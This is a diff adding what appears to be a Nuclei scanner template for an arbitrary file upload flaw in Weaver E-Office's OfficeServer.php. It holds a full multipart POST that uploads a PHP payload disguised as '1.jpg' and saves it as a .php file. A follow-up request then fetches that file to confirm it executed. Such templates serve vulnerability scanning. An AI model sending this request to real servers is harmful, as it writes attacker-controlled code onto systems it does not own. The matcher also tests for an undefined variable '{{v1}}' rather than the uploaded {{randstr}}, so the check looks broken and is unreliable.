@@ -1,0 +1,40 @@
+id: fanwei-eoffice-officeserver-php-fileupload
+
+info:
+  name: 泛微OA E-Office OfficeServer.php 任意文件上传漏洞
+  severity: critical
+  author: pphua
+  description: 泛微OA E-Office /eoffice10/server/public/iWebOffice2015/OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息
+  reference: 
+  tags: fanwei,oa,eoffice,fileupload
+
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew
+ 
+        ------WebKitFormBoundaryLpoiBFy4ANA8daew
+        Content-Disposition: form-data;name="FileData";filename="1.jpg"
+        Content-Type: application/octet-stream
+
+        <?php echo {{randstr}};@unlink ("{{randstr}}.php");?>
+
+        ------WebKitFormBoundaryLpoiBFy4ANA8daew
+        Content-Disposition: form-data;name="FormData"
+
+        {'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{randstr}}.php'}
+        ------WebKitFormBoundaryLpoiBFy4ANA8daew--
+      
+      - |
+        GET /eoffice10/server/public/iWebOffice2015/Document/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true # dsl跨请求处理需要开启选项
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains((body_2), '{{v1}}')"
+        condition: and
